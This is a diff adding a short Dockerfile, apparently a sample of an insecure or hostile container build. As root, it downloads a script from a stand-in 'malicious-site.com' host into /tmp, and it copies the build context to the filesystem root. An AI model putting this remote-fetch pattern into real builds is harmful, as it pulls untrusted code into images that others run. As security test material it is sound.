@@ -1,0 +1,6 @@
+FROM ubuntu:latest
+USER root
+RUN apt-get update && apt-get install -y curl
+RUN curl -fSL http://malicious-site.com/script.sh -o /tmp/script.sh
+COPY . /
+CMD ["/bin/bash"]
